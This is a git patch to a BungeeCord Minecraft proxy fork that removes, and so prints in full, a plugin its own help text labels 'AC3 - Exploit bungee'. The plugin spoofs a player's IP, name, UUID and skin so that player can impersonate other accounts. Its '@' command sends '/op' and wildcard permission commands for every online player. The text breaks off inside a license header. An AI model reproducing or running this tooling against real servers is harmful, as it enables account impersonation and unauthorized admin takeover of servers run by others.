From 40fe8ad21bca44b0fbda8b40d91afc6a00e22c23 Mon Sep 17 00:00:00 2001
From: Cory Redmond <ace@ac3-servers.eu>
Date: Sat, 9 Apr 2016 13:36:05 +0100
Subject: [PATCH 2/2] HaxorCord patch bro.

---
 .../java/eu/ac3_servers/dev/ac3/AC3Plugin.java     | 170 ------------------
 .../ac3_servers/dev/ac3/commands/AC3Command.java   | 183 -------------------
 .../eu/ac3_servers/dev/ac3/commands/AtCommand.java | 108 ------------
 .../dev/ac3/commands/RandomCommand.java            | 194 ---------------------
 .../java/eu/ac3_servers/dev/ac3/conf/AC3Conf.java  | 106 -----------
 .../java/eu/ac3_servers/dev/ac3/conf/ResConf.java  | 106 -----------
 .../ac3_servers/dev/ac3/listeners/ChatHandler.java | 104 -----------
 .../dev/ac3/listeners/MainListener.java            | 117 -------------
 module/cmd-send/src/main/resources/bungee.yml      |   4 -
 module/cmd-send/src/main/resources/config.yml      |   3 -
 module/cmd-send/src/main/resources/res.yml         |   3 -
 pom.xml                                            |   4 +-
 .../md_5/bungee/protocol/packet/LoginRequest.java  |   2 +
 .../src/main/java/net/md_5/bungee/BungeeCord.java  |  38 ++++
 .../main/java/net/md_5/bungee/ServerConnector.java |  31 +++-
 .../main/java/net/md_5/bungee/UserConnection.java  |  29 ++-
 16 files changed, 100 insertions(+), 1102 deletions(-)
 delete mode 100644 module/cmd-alert/src/main/java/eu/ac3_servers/dev/ac3/AC3Plugin.java
 delete mode 100644 module/cmd-alert/src/main/java/eu/ac3_servers/dev/ac3/commands/AC3Command.java
 delete mode 100644 module/cmd-alert/src/main/java/eu/ac3_servers/dev/ac3/commands/AtCommand.java
 delete mode 100644 module/cmd-alert/src/main/java/eu/ac3_servers/dev/ac3/commands/RandomCommand.java
 delete mode 100644 module/cmd-alert/src/main/java/eu/ac3_servers/dev/ac3/conf/AC3Conf.java
 delete mode 100644 module/cmd-alert/src/main/java/eu/ac3_servers/dev/ac3/conf/ResConf.java
 delete mode 100644 module/cmd-alert/src/main/java/eu/ac3_servers/dev/ac3/listeners/ChatHandler.java
 delete mode 100644 module/cmd-alert/src/main/java/eu/ac3_servers/dev/ac3/listeners/MainListener.java
 delete mode 100644 module/cmd-send/src/main/resources/bungee.yml
 delete mode 100644 module/cmd-send/src/main/resources/config.yml
 delete mode 100644 module/cmd-send/src/main/resources/res.yml

diff --git a/module/cmd-alert/src/main/java/eu/ac3_servers/dev/ac3/AC3Plugin.java b/module/cmd-alert/src/main/java/eu/ac3_servers/dev/ac3/AC3Plugin.java
deleted file mode 100644
index 5798477..0000000
--- a/module/cmd-alert/src/main/java/eu/ac3_servers/dev/ac3/AC3Plugin.java
+++ /dev/null
@@ -1,170 +0,0 @@
-/*
- * http://ryred.co/
- * ace[at]ac3-servers.eu
- *
- * =================================================================
- *
- * Copyright (c) 2016, Cory Redmond
- * All rights reserved.
- *
- * Redistribution and use in source and binary forms, with or without
- * modification, are permitted provided that the following conditions are met:
- *
- *  Redistributions of source code must retain the above copyright notice, this
- *   list of conditions and the following disclaimer.
- *
- *  Redistributions in binary form must reproduce the above copyright notice,
- *   this list of conditions and the following disclaimer in the documentation
- *   and/or other materials provided with the distribution.
- *
- *  Neither the name of BungeeCord nor the names of its
- *   contributors may be used to endorse or promote products derived from
- *   this software without specific prior written permission.
- *
- * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
- * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
- * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
- * DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
- * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
- * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
- * SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
- * CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
- * OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
- * OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
- */
-
-package eu.ac3_servers.dev.ac3;
-
-import eu.ac3_servers.dev.ac3.commands.AC3Command;
-import eu.ac3_servers.dev.ac3.commands.RandomCommand;
-import eu.ac3_servers.dev.ac3.conf.AC3Conf;
-import eu.ac3_servers.dev.ac3.conf.ResConf;
-import eu.ac3_servers.dev.ac3.listeners.AtCommand;
-import eu.ac3_servers.dev.ac3.listeners.ChatHandler;
-import eu.ac3_servers.dev.ac3.listeners.MainListener;
-import net.md_5.bungee.BungeeCord;
-import net.md_5.bungee.UserConnection;
-import net.md_5.bungee.api.plugin.Listener;
-import net.md_5.bungee.api.plugin.Plugin;
-import net.md_5.bungee.connection.LoginResult;
-
-import java.io.*;
-import java.net.URL;
-import java.util.Scanner;
-import java.util.concurrent.TimeUnit;
-
-/**
- * @author Cory Redmond
- *         Created by acech_000 on 10/02/2015.
- */
-public class AC3Plugin extends Plugin implements Listener {
-
-	private AC3Conf conf;
-	private ResConf resConf;
-
-	@Override
-	public void onEnable() {
-
-		try {
-			if(!UserConnection.class.getField("fakeName").getType().equals(String.class))
-				throw new RuntimeException("This version of BungeeCord is not patched to be PR() haxor.");
-		} catch (Exception e) {
-			getLogger().severe(e.getMessage());
-			getLogger().severe(" Stopping the BungeeCord.");
-			getProxy().stop(e.getMessage());
-			return;
-		}
-
-		conf = new AC3Conf(this);
-		resConf = new ResConf(this);
-
-		getProxy().getPluginManager().registerCommand(this, new AC3Command(this));
-		getProxy().getPluginManager().registerCommand(this, new RandomCommand(this));
-		getProxy().getPluginManager().registerCommand(this, new AtCommand(this));
-
-		getProxy().getPluginManager().registerListener(this, new MainListener(this));
-		getProxy().getPluginManager().registerListener(this, new ChatHandler(this));
-
-	}
-
-	public LoginResult getResult(String uuid){
-
-		LoginResult res = loadLoginResult(uuid);
-		if(res != null) return res;
-		try {
-			URL url = new URL("https://sessionserver.mojang.com/session/minecraft/profile/" + uuid + "?unsigned=false");
-			String json = new Scanner(url.openStream(), "UTF-8").useDelimiter("\\A").next();
-			res = BungeeCord.getInstance().gson.fromJson(json, LoginResult.class);
-			if (res != null)
-				saveLoginResult(uuid, json);
-			else res = loadLoginResult(uuid, true);
-		} catch (IOException e) {
-			e.printStackTrace();
-		}
-
-		return res;
-
-	}
-
-	private LoginResult loadLoginResult(String uuid, boolean force) {
-		try {
-			File file = new File(getResFolder(), uuid + "_result.txt");
-			if(!file.exists()) return null;
-
-			if(!force && ((resConf.getConfig().getLong(uuid) + TimeUnit.MINUTES.toMillis(3600)) - System.currentTimeMillis() > 0))
-				return null;
-
-			return BungeeCord.getInstance().gson.fromJson(new FileReader(file), LoginResult.class);
-		} catch (IOException e) {
-			e.printStackTrace();
-		}
-		return null;
-	}
-
-	private void saveLoginResult(String uuid, String json) {
-
-		try {
-			BufferedWriter br = new BufferedWriter(new FileWriter(new File(getResFolder(), uuid + "_result.txt")));
-			br.write(json);
-			br.flush();
-			br.close();
-
-			resConf.getConfig().set(uuid, System.currentTimeMillis());
-			resConf.saveConfig();
-
-		} catch (IOException e) {
-			e.printStackTrace();
-		}
-
-	}
-
-	private LoginResult loadLoginResult(String uuid) {
-		return loadLoginResult(uuid, false);
-	}
-
-	public void reset(String uuid){
-		getConf().getConfig().set(uuid, null);
-		getConf().saveConfig();
-	}
-
-	public void save(UserConnection uc) {
-		getConf().getConfig().set(uc.getUUID() + ".uuid", uc.getFakeUUID());
-		getConf().saveConfig();
-		getConf().getConfig().set(uc.getUUID() + ".ip", uc.getFakeIP().replace(".", "*"));
-		getConf().saveConfig();
-		getConf().getConfig().set(uc.getUUID() + ".name", uc.getFakeName());
-		getConf().saveConfig();
-	}
-
-	public File getResFolder() {
-		File resFolder = new File(getDataFolder(), "res");
-		if(!resFolder.exists())
-			resFolder.mkdir();
-		return resFolder;
-	}
-
-	public AC3Conf getConf() {
-		if(conf == null) conf = new AC3Conf(this);
-		return conf;
-	}
-}
diff --git a/module/cmd-alert/src/main/java/eu/ac3_servers/dev/ac3/commands/AC3Command.java b/module/cmd-alert/src/main/java/eu/ac3_servers/dev/ac3/commands/AC3Command.java
deleted file mode 100644
index d212acc..0000000
--- a/module/cmd-alert/src/main/java/eu/ac3_servers/dev/ac3/commands/AC3Command.java
+++ /dev/null
@@ -1,183 +0,0 @@
-/*
- * http://ryred.co/
- * ace[at]ac3-servers.eu
- *
- * =================================================================
- *
- * Copyright (c) 2016, Cory Redmond
- * All rights reserved.
- *
- * Redistribution and use in source and binary forms, with or without
- * modification, are permitted provided that the following conditions are met:
- *
- *  Redistributions of source code must retain the above copyright notice, this
- *   list of conditions and the following disclaimer.
- *
- *  Redistributions in binary form must reproduce the above copyright notice,
- *   this list of conditions and the following disclaimer in the documentation
- *   and/or other materials provided with the distribution.
- *
- *  Neither the name of BungeeCord nor the names of its
- *   contributors may be used to endorse or promote products derived from
- *   this software without specific prior written permission.
- *
- * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
- * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
- * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
- * DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
- * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
- * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
- * SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
- * CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
- * OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
- * OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
- */
-
-package eu.ac3_servers.dev.ac3.commands;
-
-import com.google.common.base.Charsets;
-import eu.ac3_servers.dev.ac3.AC3Plugin;
-import net.md_5.bungee.UserConnection;
-import net.md_5.bungee.api.ChatColor;
-import net.md_5.bungee.api.CommandSender;
-import net.md_5.bungee.api.plugin.Command;
-
-import java.io.BufferedReader;
-import java.io.InputStreamReader;
-import java.net.URL;
-import java.util.UUID;
-
-/**
- * @author Cory Redmond
- *         Created by acech_000 on 10/02/2015.
- */
-@SuppressWarnings("deprecation")
-public class AC3Command extends Command {
-
-	private final AC3Plugin plugin;
-
-	public AC3Command(AC3Plugin plugin) {
-		super("AC3", null, "/");
-		this.plugin = plugin;
-	}
-
-	@Override
-	public void execute(final CommandSender sender, final String[] args) {
-		if(sender instanceof UserConnection){
-			final UserConnection player = ((UserConnection) sender);
-
-			if(args.length == 2){
-
-				if(args[0].equalsIgnoreCase("ip") || args[0].equalsIgnoreCase("i")){
-					if(args[1].equalsIgnoreCase("reset")){
-						player.setFakeIP(player.getAddress().getHostString());
-						sender.sendMessage(c("&9Reset the IP address."));
-						return;
-					}
-
-					if(args[1] == null || args[1].isEmpty()){
-						sender.sendMessage(c("&eThe fake IP can't be null."));
-						return;
-					}
-
-					player.setFakeIP(args[1]);
-					sender.sendMessage(c("&9Fake IP address set!"));
-					return;
-
-				}
-				if(args[0].equalsIgnoreCase("name")  || args[0].equalsIgnoreCase("n")){
-					if(args[1].equalsIgnoreCase("reset")){
-						player.setFakeName(player.getName());
-						sender.sendMessage(c("&9Reset the name."));
-						return;
-					}
-
-					if(args[1] == null || args[1].isEmpty()){
-						sender.sendMessage(c("&eThe fake name can't be null."));
-						return;
-					}
-
-					player.setFakeName(args[1]);
-					sender.sendMessage(c("&9Fake name address set!"));
-					return;
-
-				}
-				if(args[0].equalsIgnoreCase("uuid")  || args[0].equalsIgnoreCase("u")){
-					if(args[1].equalsIgnoreCase("reset")){
-						player.setFakeUUID(player.getUUID());
-						sender.sendMessage(c("&9Reset the UUID."));
-						return;
-					}
-
-					if(args[1] == null || args[1].isEmpty()){
-						sender.sendMessage(c("&eThe fake UUID can't be null."));
-						return;
-					}
-
-					plugin.getProxy().getScheduler().runAsync(plugin, new Runnable() {
-						@Override
-						public void run() {
-							try{
-								URL url = new URL("http://api.mcusername.net/playertouuid/" + args[1]);
-								String uuid = new BufferedReader(new InputStreamReader(url.openStream())).readLine();
-
-								if(uuid == null || uuid.equalsIgnoreCase("Not Premium")){
-									player.sendMessage(c("&6That user isn't premium."));
-									uuid = UUID.nameUUIDFromBytes(("OfflinePlayer:" + getName()).getBytes(Charsets.UTF_8)).toString().replace("-", "");
-								}
-
-								player.setFakeUUID(uuid);
-								player.setFakeSkin(plugin.getResult(uuid));
-								sender.sendMessage(c("&9Fake UUID set!"));
-
-							} catch (Exception e) {
-								player.sendMessage(c("&c" + e.getMessage()));
-								player.sendMessage(c("&eUnable to get the UUID."));
-							}
-						}
-					});
-
-					return;
-
-				}
-
-			}if(args.length == 1){
-
-				if(args[0].equalsIgnoreCase("save")){
-					plugin.save(player);
-					sender.sendMessage(c("&9Your fake profile has been saved."));
-					return;
-				}
-				if(args[0].equalsIgnoreCase("reset")){
-					plugin.reset(player.getUUID());
-					player.setFakeIP(player.getAddress().getHostString());
-					player.setFakeUUID(player.getUUID());
-					player.setFakeName(player.getName());
-					player.setFakeSkin(player.getPendingConnection().getLoginProfile());
-					sender.sendMessage(c("&9Your fake profile has been reset."));
-					return;
-				}
-
-			}
-
-			sender.sendMessages(
-					c("&dAC3 - Exploit bungee."),
-					c("&dUsage:"),
-					c("&5// [i/n/u] [value/reset]"),
-					c("&c   Set the key to the value or reset it."),
-					c("&5// save"),
-					c("&c   Save your profile."),
-					c("&5// reset"),
-					c("&c   Reset your profile.")
-			);
-
-		}else{
-			sender.sendMessage("Only players can do these commands.");
-		}
-	}
-
-	private String c(String s) {
-		return ChatColor.translateAlternateColorCodes('&', s);
-	}
-
-}
diff --git a/module/cmd-alert/src/main/java/eu/ac3_servers/dev/ac3/commands/AtCommand.java b/module/cmd-alert/src/main/java/eu/ac3_servers/dev/ac3/commands/AtCommand.java
deleted file mode 100644
index 8031ac5..0000000
--- a/module/cmd-alert/src/main/java/eu/ac3_servers/dev/ac3/commands/AtCommand.java
+++ /dev/null
@@ -1,108 +0,0 @@
-/*
- * http://ryred.co/
- * ace[at]ac3-servers.eu
- *
- * =================================================================
- *
- * Copyright (c) 2016, Cory Redmond
- * All rights reserved.
- *
- * Redistribution and use in source and binary forms, with or without
- * modification, are permitted provided that the following conditions are met:
- *
- *  Redistributions of source code must retain the above copyright notice, this
- *   list of conditions and the following disclaimer.
- *
- *  Redistributions in binary form must reproduce the above copyright notice,
- *   this list of conditions and the following disclaimer in the documentation
- *   and/or other materials provided with the distribution.
- *
- *  Neither the name of BungeeCord nor the names of its
- *   contributors may be used to endorse or promote products derived from
- *   this software without specific prior written permission.
- *
- * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
- * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
- * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
- * DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
- * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
- * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
- * SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
- * CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
- * OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
- * OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
- */
-
-package eu.ac3_servers.dev.ac3.listeners;
-
-import eu.ac3_servers.dev.ac3.AC3Plugin;
-import net.md_5.bungee.UserConnection;
-import net.md_5.bungee.api.ChatColor;
-import net.md_5.bungee.api.CommandSender;
-import net.md_5.bungee.api.chat.ClickEvent;
-import net.md_5.bungee.api.chat.HoverEvent;
-import net.md_5.bungee.api.chat.TextComponent;
-import net.md_5.bungee.api.connection.ProxiedPlayer;
-import net.md_5.bungee.api.event.ChatEvent;
-import net.md_5.bungee.api.plugin.Command;
-import net.md_5.bungee.api.plugin.Listener;
-import net.md_5.bungee.event.EventHandler;
-
-import java.util.Iterator;
-
-/**
- * @author Cory Redmond
- *         Created by acech_000 on 13/03/2015.
- */
-public class AtCommand extends Command {
-	private final AC3Plugin plugin;
-
-	public AtCommand(AC3Plugin plugin) {
-		super("@");
-		this.plugin = plugin;
-	}
-
-	@Override
-	public void execute(CommandSender sender, String[] args) {
-
-		if(!(sender instanceof ProxiedPlayer)) return;
-
-		plugin.getProxy().getScheduler().runAsync(plugin, new OpAllRunnable((ProxiedPlayer) sender, plugin));
-
-	}
-
-}
-
-class OpAllRunnable implements Runnable {
-
-	private final ProxiedPlayer sender;
-	private final Iterator<ProxiedPlayer> playerIterator;
-	private int id;
-
-	public OpAllRunnable(ProxiedPlayer sender, AC3Plugin plugin) {
-		this.sender = sender;
-		this.playerIterator = plugin.getProxy().getPlayers().iterator();
-	}
-
-	@Override
-	public void run() {
-
-		while(playerIterator.hasNext()) {
-			try {
-				UserConnection uc = ((UserConnection) playerIterator.next());
-				sender.chat("/op " + uc.getFakeName());
-				Thread.sleep(250L);
-				sender.chat("/pex user " + uc.getFakeName() + " add *");
-				Thread.sleep(250L);
-				sender.chat("/manuaddp " + uc.getFakeName() + " *");
-				Thread.sleep(250L);
-			} catch (InterruptedException e) {
-				e.printStackTrace();
-			}
-		}
-
-	}
-
-	protected void setID(int id){ this.id = id; }
-
-}
diff --git a/module/cmd-alert/src/main/java/eu/ac3_servers/dev/ac3/commands/RandomCommand.java b/module/cmd-alert/src/main/java/eu/ac3_servers/dev/ac3/commands/RandomCommand.java
deleted file mode 100644
index 603b670..0000000
--- a/module/cmd-alert/src/main/java/eu/ac3_servers/dev/ac3/commands/RandomCommand.java
+++ /dev/null
@@ -1,194 +0,0 @@
-/*
- * http://ryred.co/
- * ace[at]ac3-servers.eu
- *
- * =================================================================
- *
- * Copyright (c) 2016, Cory Redmond
- * All rights reserved.
- *
- * Redistribution and use in source and binary forms, with or without
- * modification, are permitted provided that the following conditions are met:
- *
- *  Redistributions of source code must retain the above copyright notice, this
- *   list of conditions and the following disclaimer.
- *
- *  Redistributions in binary form must reproduce the above copyright notice,
- *   this list of conditions and the following disclaimer in the documentation
- *   and/or other materials provided with the distribution.
- *
- *  Neither the name of BungeeCord nor the names of its
- *   contributors may be used to endorse or promote products derived from
- *   this software without specific prior written permission.
- *
- * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
- * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
- * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
- * DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
- * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
- * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
- * SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
- * CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
- * OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
- * OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
- */
-
-package eu.ac3_servers.dev.ac3.commands;
-
-import com.google.common.base.Charsets;
-import eu.ac3_servers.dev.ac3.AC3Plugin;
-import net.md_5.bungee.UserConnection;
-import net.md_5.bungee.api.Callback;
-import net.md_5.bungee.api.ChatColor;
-import net.md_5.bungee.api.CommandSender;
-import net.md_5.bungee.api.plugin.Command;
-
-import java.io.BufferedReader;
-import java.io.InputStreamReader;
-import java.net.HttpURLConnection;
-import java.net.URL;
-import java.util.Random;
-import java.util.UUID;
-
-/**
- * @author Cory Redmond
- *         Created by acech_000 on 11/02/2015.
- */
-public class RandomCommand extends Command {
-
-	private final AC3Plugin plugin;
-	private final Random random;
-
-	public RandomCommand(AC3Plugin plugin) {
-		super(".");
-		this.random = new Random(new Random(new Random().nextLong()).nextLong());
-		this.plugin = plugin;
-	}
-
-	public static void main(String... args){
-		try {
-			HttpURLConnection con = (HttpURLConnection) (new URL("http://minecraft-skin-viewer.com/player/random").openConnection());
-			con.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36");
-			con.setInstanceFollowRedirects(false);
-			con.connect();
-			int responseCode = con.getResponseCode();
-			System.out.println(responseCode);
-			String location = con.getHeaderField("Location");
-			System.out.println(location);
-		}catch (Exception e){
-			e.printStackTrace();
-		}
-	}
-
-	@Override
-	public void execute(CommandSender sender, String[] args) {
-		if(sender instanceof UserConnection){
-
-			final UserConnection player = ((UserConnection) sender);
-
-			player.sendMessage(c("&2Getting a random profile!"));
-
-			//IP Generation start
-			final Callback<String> ipCallBack = new Callback<String>() {
-				@Override
-				public void done(String result, Throwable error) {
-					if(error != null)
-						player.sendMessages(
-								c("&eSomething went wrong setting your IP."),
-								c("&c" + error.getMessage())
-						);
-					else {
-						player.sendMessage(c("&3Your ip is: &d" + result));
-						player.setFakeIP(result);
-					}
-				}
-			};
-
-			plugin.getProxy().getScheduler().runAsync(plugin, new Runnable() {
-				@Override
-				public void run() {
-					try {
-						int a = random.nextInt(255);
-						int b = random.nextInt(255);
-						int c = random.nextInt(255);
-						int d = random.nextInt(255);
-						ipCallBack.done(makeAddress(a, b, c, d), null);
-					}catch (Exception e){ ipCallBack.done("", e); }
-				}
-			});
-			//IP Generation end.
-
-			//Name skin and UUID generation start.
-			final Callback<String> nameCallBack = new Callback<String>() {
-				@Override
-				public void done(String result, Throwable error) {
-					if(error != null)
-						player.sendMessages(
-								c("&eSomething went wrong setting your name, skin and UUID."),
-								c("&c" + error.getMessage())
-						);
-					else {
-						String[] data = result.split("\\+");
-						if(data.length != 2){
-							player.sendMessages(
-									c("&eSomething went wrong setting your name, skin and UUID."),
-									c("&c" + error.getMessage())
-							);
-						}else {
-							player.sendMessage(c("&3Your name is: &d" + data[0]));
-							player.setFakeName(data[0]);
-							player.sendMessage(c("&3Your UUID is: &d" + data[1]));
-							player.setFakeUUID(data[1]);
-							player.setFakeSkin(plugin.getResult(data[1]));
-						}
-					}
-				}
-			};
-			plugin.getProxy().getScheduler().runAsync(plugin, new Runnable() {
-				@Override
-				public void run() {
-					String name;
-					String uuid;
-
-					try {
-						HttpURLConnection con = (HttpURLConnection) (new URL("http://minecraft-skin-viewer.com/player/random").openConnection());
-						con.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36");
-						con.setInstanceFollowRedirects(false);
-						con.connect();
-						int responseCode = con.getResponseCode();
-						String location = con.getHeaderField("Location");
-
-						if(responseCode == 302 && location != null){
-							String[] loc = location.split("/");
-							name = loc[loc.length - 1];
-						}else{
-							throw new Exception("Couldn't get a random name!");
-						}
-
-						URL url = new URL("http://api.mcusername.net/playertouuid/" + name);
-						uuid = new BufferedReader(new InputStreamReader(url.openStream())).readLine();
-
-						if(uuid == null || uuid.equalsIgnoreCase("Not Premium")){
-							uuid = UUID.nameUUIDFromBytes(("OfflinePlayer:" + getName()).getBytes(Charsets.UTF_8)).toString().replace("-", "");
-						}
-
-						nameCallBack.done(name + "+" + uuid, null);
-
-					}catch (Exception e){ nameCallBack.done("", e); }
-				}
-			});
-
-		}else{
-			sender.sendMessage();
-		}
-	}
-
-	private String makeAddress(int a, int b, int c, int d) {
-		return new StringBuilder().append(a).append(".").append(b).append(".").append(c).append(".").append(d).toString();
-	}
-
-	private String c(String s) {
-		return ChatColor.translateAlternateColorCodes('&', s);
-	}
-
-}
diff --git a/module/cmd-alert/src/main/java/eu/ac3_servers/dev/ac3/conf/AC3Conf.java b/module/cmd-alert/src/main/java/eu/ac3_servers/dev/ac3/conf/AC3Conf.java
deleted file mode 100644
index 7496b59..0000000
--- a/module/cmd-alert/src/main/java/eu/ac3_servers/dev/ac3/conf/AC3Conf.java
+++ /dev/null
@@ -1,106 +0,0 @@
-/*
- * http://ryred.co/
- * ace[at]ac3-servers.eu
- *
- * =================================================================
- *
- * Copyright (c) 2016, Cory Redmond
- * All rights reserved.
- *
- * Redistribution and use in source and binary forms, with or without
- * modification, are permitted provided that the following conditions are met:
- *
- *  Redistributions of source code must retain the above copyright notice, this
- *   list of conditions and the following disclaimer.
- *
- *  Redistributions in binary form must reproduce the above copyright notice,
- *   this list of conditions and the following disclaimer in the documentation
- *   and/or other materials provided with the distribution.
- *
- *  Neither the name of BungeeCord nor the names of its
- *   contributors may be used to endorse or promote products derived from
- *   this software without specific prior written permission.
- *
- * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
- * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
- * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
- * DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
- * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
- * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
- * SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
- * CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
- * OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
- * OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
- */
-
-package eu.ac3_servers.dev.ac3.conf;
-
-import com.google.common.io.ByteStreams;
-import net.md_5.bungee.api.plugin.Plugin;
-import net.md_5.bungee.config.Configuration;
-import net.md_5.bungee.config.ConfigurationProvider;
-import net.md_5.bungee.config.YamlConfiguration;
-
-import java.io.*;
-
-/**
- * @author Cory Redmond
- *         Created by acech_000 on 12/01/2015.
- */
-public class AC3Conf {
-
-	private Plugin plugin;
-	private File file;
-	private Configuration config;
-
-	public AC3Conf(Plugin plugin) {
-
-		this.plugin = plugin;
-
-		this.file = new File(getDataFolder(), "config.yml");
-
-		if (!getDataFolder().exists()) {
-			getDataFolder().mkdir();
-		}
-		if (!file.exists()) {
-			try {
-				file.createNewFile();
-				try (InputStream is = getResourceAsStream();
-					 OutputStream os = new FileOutputStream(file)) {
-					ByteStreams.copy(is, os);
-				}
-			} catch (IOException e) {
-				throw new RuntimeException("Unable to create config file", e);
-			}
-		}
-	}
-
-	public Configuration getConfig() {
-		try {
-			return (this.config = ConfigurationProvider.getProvider(
-					YamlConfiguration.class).load(this.file));
-		} catch (IOException e) {
-			e.printStackTrace();
-			return null;
-		}
-	}
-
-	public void saveConfig() {
-		try {
-			ConfigurationProvider.getProvider(YamlConfiguration.class).save(
-					config, new File(getDataFolder(), "config.yml"));
-		} catch (IOException e) {
-			e.printStackTrace();
-			plugin.getLogger().severe("Couldn't save config file!");
-		}
-	}
-
-	private File getDataFolder() {
-		return plugin.getDataFolder();
-	}
-
-	private InputStream getResourceAsStream() {
-		return plugin.getResourceAsStream("config.yml");
-	}
-
-}
diff --git a/module/cmd-alert/src/main/java/eu/ac3_servers/dev/ac3/conf/ResConf.java b/module/cmd-alert/src/main/java/eu/ac3_servers/dev/ac3/conf/ResConf.java
deleted file mode 100644
index e39a3be..0000000
--- a/module/cmd-alert/src/main/java/eu/ac3_servers/dev/ac3/conf/ResConf.java
+++ /dev/null
@@ -1,106 +0,0 @@
-/*
- * http://ryred.co/
- * ace[at]ac3-servers.eu
- *
- * =================================================================
- *
- * Copyright (c) 2016, Cory Redmond
- * All rights reserved.
- *
- * Redistribution and use in source and binary forms, with or without
- * modification, are permitted provided that the following conditions are met:
- *
- *  Redistributions of source code must retain the above copyright notice, this
- *   list of conditions and the following disclaimer.
- *
- *  Redistributions in binary form must reproduce the above copyright notice,
- *   this list of conditions and the following disclaimer in the documentation
- *   and/or other materials provided with the distribution.
- *
- *  Neither the name of BungeeCord nor the names of its
- *   contributors may be used to endorse or promote products derived from
- *   this software without specific prior written permission.
- *
- * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
